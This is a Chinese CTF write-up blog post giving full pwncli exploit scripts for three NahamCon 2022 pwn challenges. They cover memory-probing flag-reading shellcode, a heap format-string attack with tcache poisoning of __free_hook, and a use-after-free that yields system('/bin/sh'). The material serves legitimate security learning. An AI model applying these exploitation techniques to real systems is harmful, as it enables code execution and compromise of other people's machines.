# 2022-nahamconCTF-pwn



# 2022-nahamconCTF-pwn

记录下`wp`。

<!-- more -->

## nahamconCTF-stackless

### 解题思路

也是一道`shellcode`题，开启了沙箱：

![image-20220430234806396](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220430234806396.png)

执行`shellcode`的时候所有的寄存器都变成了`0`：

![image-20220430234842737](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220430234842737.png)

最后也执行了`xor r15, r15`，还把页权限改为了`read|exec`，也就是不可`write`

读取`flag`需要一个可读可写的地址，当前可用的地址又不能写，所以只能猜测一个可读可写的地址，步骤如下：

- `rsi`赋值为`0x7f0000000000`
- 开始循环，每次`rsi += 0x100000`，然后尝试`write(1, rsi, 0x30)`，然后判断`rax`是否为负数，如果是负数，继续循环
- 当结束上面的循环的时候，说明我们找到了`libc`的地址空间，但是可读不一定可写
- 所以开启新的循环，用`read(0, rsi, 1)`去找一个可写的区域，然后判断`rax`，这里每次`rsi += 0x1000`
- 找到可写的段后，开始`open read write`即可

比较坑的是，路径为`/home/challenge/flag.txt`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']


sla("Shellcode length\n", str(0x400))

# 利用write的返回值和read的返回值判断是否找到一个可读可写的段

shellcode = """
mov edi, 1
mov rsi, 0x7f0000000000
mov edx, 0x30
L1:
add rsi, 0x100000
mov eax, 1
syscall
test eax, eax
jng L1
xor edi, edi
mov edx, 1
L2:
add rsi, 0x1000
xor eax, eax
syscall
test eax, eax
jng L2
add rsi, 0x18
mov rsp, rsi
mov rax, 0x7478742e67616c66
push rax
mov rax, 0x2f65676e656c6c61
push rax
mov rax, 0x68632f656d6f682f
push rax
mov rax, 0
mov [rsp+0x18], rax
mov rdi, rsp
xor esi, esi
xor edx, edx
mov eax, 2 
syscall
mov edi, eax
xor eax, eax
mov edx, 0x30
mov rsi, rsp
syscall
mov edi, 1
mov eax, 1
syscall
"""

data = asm(shellcode) + ShellcodeMall.amd64.cat_flag

sa("Shellcode\n", data)
sleep(3)
s("\x90"*0x1000)

ia()
```





![QQ图片20220430234525](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/QQ图片20220430234525.png)

## nahamconCTF-reading_list

### 解题思路

有个格式化字符串的洞

![image-20220430235445534](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220430235445534.png)

是一个堆上的格式化字符串。解题思路如下：

- 泄露`libc`，`pie`和栈地址、堆地址
- 在栈上找一个链，修改`booklist`为可控的堆地址
- 构造`overlapped chunk`，利用`tcache bin poisoning`分配到`__free_hook`上

这里有个坑点是`getline`每次`malloc`似乎都是固定大小，之后会`realloc`调整堆

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from socket import timeout
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

context.update(timeout=5)

def show_list(n):
    sla("> ", "1")
    m = rs(n)
    log_ex(f"msg: {m}")
    return m

def add(name):
    sla("> ", "2")
    sla("Enter the book name: ", name)


def remove(idx):
    sla("> ", "3")
    sla(": ", str(idx))


def change(name):
    sla("> ", "4")
    sla("What is your name: ", name)


sla("What is your name: ", "roderick")

add("%6$p,%7$p,%23$p")
m = show_list(2)
m = (m[1][3:]).split(b",")
print(m)

code_base = int16_ex(m[0]) -0x11c0
stack_addr = int16_ex(m[1])
libc_base = int16_ex(m[2]) - libc.sym["__libc_start_main"] - 243

log_code_base_addr(code_base)
log_address("stack_addr", stack_addr)
log_libc_base_addr(libc_base)

for i in range(0x10):
    add("deadbeef")

for i in range(0x10):
    remove(1)

hook_addr = code_base + 0x4030
gadget_addr = libc_base + 0x00000000001518b0
target_stack_addr = stack_addr + 0x68
# 25 53
add(f"%{target_stack_addr & 0xffff}c%25$hn")
show_list(1)

add(f"%{hook_addr & 0xffff}c%53$hn")
show_list(1)

for i in range(1):
    target_stack_addr += 2
    hook_addr >>= 16
    add(f"%{target_stack_addr & 0xffff}c%25$hn")
    show_list(1)
    add(f"%{hook_addr & 0xffff}c%53$hn")
    show_list(1)


add("cafebeef%27$s")
show_list(1)
ru("cafebeef")
m = rs(2)[0]
heap_base = u64_ex(m) - 0x860
log_heap_base_addr(heap_base)

add(p64_ex(heap_base + 0xa90)*8)

heap_addr = heap_base + 0x340
add(f"%{heap_addr & 0xffff}c%27$hn".ljust(0x10, "a").encode() + cyclic(0x60))
show_list(1)

add("a"*0x70)
add(flat({0x58:0x81}, length=0x70))
add("c"*0x70)
add("d"*0x70)
add("e"*0x70)

remove(10)
remove(10)
remove(1)

add(flat({0x20:libc_base + libc.sym.__free_hook}, length=0x70))
add("/bin/sh;".ljust(0x70, "a"))
add(p64(libc.sym.system + libc_base)*0xe)

remove(12)

ia()
```





![img](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/Y@~UXWSGAY0Q77KFU473X9J.png)



## nahamconCTF-free_real_estate

### 解题思路

有个`UAF`

![image-20220501005340020](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220501005340020.png)

结构体信息为：

```c
struct Prop{
void * _1;
void * _2;
float price;
size_t house_number;
char*  street_name;
size_t * street_length;
char * comment;
size_t comment_length;
};
```



### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def show():
    sla("> ", "1")


def add(hn=1, sn=0x10, name="cafebeef", cn=0x10, a="y", c="deadbeef"):
    sla("> ", "2")
    sla("Enter the house number: ", str(hn))
    sla("What is the length of the street name: ", str(sn))
    sla("Enter the street name: ", name)
    sla("What is the price of the property?: ", "1.1")
    sla("Would you like to add a comment for this property? [y/n]: ", a)
    if a =="y":
        sla("What is the length of the comment?: ", str(cn))
        sla("Enter the comment: ", c)

def remove():
    sla("> ", "3")


def edit(cs="n", sl=0, sn=None, cc='y', cn=0, c="deadbeef"):
    sla("> ", "4")
    sla("Would you like to change the house number? [y/n]: ", 'n')
    sla("Would you like to change the street? [y/n]: ", cs)
    if cs == "y":
        sla("Enter the new street name length: ", str(sl))
        sla("Enter the new street name: ", sn)

    sla("Would you like to change the price of the property? [y/n]: ", "n")
    m = ru("comment")
    sl(cc)
    if cc == "n":
        return
    if b"Would you like to change" in m:
        sla("Enter the new comment length: ", str(cn))
        sla("Enter the new comment: ", c)
    else:
        sla("What is the length of the comment?: ", str(cn))
        sla("Enter the comment: ", c)


def change(nn, name=None):
    sla("> ", "5")
    sla("What is the length of your new name?: ", str(nn))
    if name:
        sla("Enter your new name: ", name)

sla("Enter your name: ", "roderick")
add(cn=0x440)

change(0x20, "deadbeef")
remove()

add(a="n")
show()

libc_base = recv_current_libc_addr(offset=0x1ecbe0)
set_current_libc_base_and_log(libc_base, 0)

change(0x40, cyclic(0x30))
remove()

add(sn=0x40, cn=0x40)
remove()

change(0x40, p64(libc.sym.__free_hook))
add(sn=0x40, cn=0x40, c=p64(libc.sym.system))

change(0x40, "/bin/sh;")

change(0x100)

ia()
```



![image-20220501005242930](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220501005242930.png)



## 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-04-30-nahamconctf-pwn/  

